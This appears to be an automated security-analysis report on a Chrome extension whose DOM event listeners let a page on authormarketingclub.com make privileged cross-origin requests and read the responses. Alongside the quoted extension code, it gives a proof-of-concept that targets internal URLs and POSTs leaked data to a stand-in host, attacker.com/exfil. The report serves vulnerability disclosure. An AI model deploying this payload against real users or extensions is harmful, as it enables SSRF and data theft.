# CoCo Analysis: inlgicfmeigblaaglencnnkdacljnahk

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2

---

## Sink 1: document_eventListener_fetchPage → XMLHttpRequest_url_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/inlgicfmeigblaaglencnnkdacljnahk/opgen_generated_files/cs_0.js
Line 469: document.addEventListener('fetchPage', function(event) {
Line 470: var d = event.detail;
Line 471: callGet(d.url, false, d.resultsEventName);

**Code:**

```javascript
// Content script - DOM event listener (only on authormarketingclub.com/members/*)
document.addEventListener('fetchPage', function(event) {
    var d = event.detail; // ← attacker-controlled event data
    callGet(d.url, false, d.resultsEventName); // ← passes attacker URL
});

document.addEventListener('fetchJSON', function(event) {
    var d = event.detail; // ← attacker-controlled event data
    callGet(d.url, true, d.resultsEventName); // ← passes attacker URL
});

var port = chrome.runtime.connect({name: "AMCRGget"});

function callGet(url, reqWithXMLHR, resultsEventName) {
    port.postMessage({url: url, reqWithXMLHR: reqWithXMLHR}); // ← sends to background
    port.onMessage.addListener(function(msg) {
        var getResponse = new CustomEvent(resultsEventName, {"detail": msg});
        document.dispatchEvent(getResponse); // ← sends response back to webpage
    });
}

// Background script - connection handler
chrome.runtime.onConnect.addListener(function(port) {
    console.assert(port.name == "AMCRGget");
    port.onMessage.addListener(function(msg) {
        get(msg.url, msg.reqWithXMLHR).then(function (page) { // ← uses attacker URL
            port.postMessage({page: page}); // ← sends response back to content script
        }).catch(function(errorStatus) {
            port.postMessage({errorStatus: errorStatus});
        });
    });
});

function get(url, reqWithXMLHR=false) {
    return new Promise(function(resolve, reject) {
        var req = new XMLHttpRequest();
        req.open('GET', url); // ← XMLHttpRequest with attacker-controlled URL
        req.setRequestHeader('Accept', 'text/html,application/xhtml+xml,*/*;q=0.8');
        if (reqWithXMLHR) {
            req.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
        }
        req.onload = function() {
            if (req.status == 200) {
                resolve(req.response); // ← response sent back to attacker
            }
        };
        req.send();
    });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event listener (document.addEventListener)

**Attack:**

```javascript
// From authormarketingclub.com/members/* webpage
// Attack: SSRF + Information Disclosure
var event = new CustomEvent('fetchPage', {
    detail: {
        url: 'https://internal-api.amazon.com/sensitive-data', // ← attacker URL
        resultsEventName: 'gotResults'
    }
});
document.dispatchEvent(event);

// Listen for response
document.addEventListener('gotResults', function(event) {
    console.log('Leaked data:', event.detail.page);
    // Send to attacker server
    fetch('https://attacker.com/exfil', {
        method: 'POST',
        body: JSON.stringify(event.detail)
    });
});

// Alternative attack: Fetch internal network resources
var event2 = new CustomEvent('fetchJSON', {
    detail: {
        url: 'http://192.168.1.1/admin',
        resultsEventName: 'internalData'
    }
});
document.dispatchEvent(event2);
```

**Impact:** SSRF and information disclosure vulnerability. Attacker-controlled webpage on authormarketingclub.com/members/* can dispatch custom DOM events with arbitrary URLs. The extension makes privileged XMLHttpRequest calls to these attacker-specified URLs (bypassing CORS) and sends the responses back to the webpage via custom events. This allows: (1) SSRF - making requests to internal network resources, Amazon APIs, or any cross-origin target, (2) Information disclosure - exfiltrating response data to attacker-controlled servers. The extension has permissions for *.amazon.com, making this particularly dangerous for accessing Amazon's internal APIs.

---

## Sink 2: document_eventListener_fetchJSON → XMLHttpRequest_url_sink

**Classification:** TRUE POSITIVE

**Reason:** Same vulnerability as Sink 1, but triggered via the 'fetchJSON' event listener instead of 'fetchPage'. Both allow attacker to specify arbitrary URLs for privileged fetch operations.
